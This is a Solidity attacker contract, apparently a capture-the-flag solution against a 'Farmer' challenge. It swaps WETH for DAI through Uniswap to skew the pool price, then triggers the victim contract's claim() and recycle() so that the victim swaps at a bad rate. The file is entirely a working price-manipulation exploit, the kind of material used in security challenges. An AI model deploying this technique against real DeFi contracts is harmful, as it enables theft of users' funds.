// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "./Setup.sol";
import "hardhat/console.sol";


contract FarmerAttacker {

    Setup setup;

    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    ERC20Like public constant DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    UniRouter public constant ROUTER = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
    }

    function attack() public payable {
        CompDaiFarmer farmer = CompDaiFarmer(setup.farmer());

        WETH.deposit{value: msg.value}();
        WETH.approve(address(ROUTER), type(uint256).max);

        uint256 bal = WETH.balanceOf(address(this));

        // Swap WETH for DAI to increase the price of DAI/WETH - so the amount of DAI that is `recycled` in the farmer contract would not be as much.
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DAI);
        ROUTER.swapExactTokensForTokens(
            bal,
            0,
            path,
            address(this),
            block.timestamp + 1800
        );

        farmer.claim();
        farmer.recycle();
    }
}
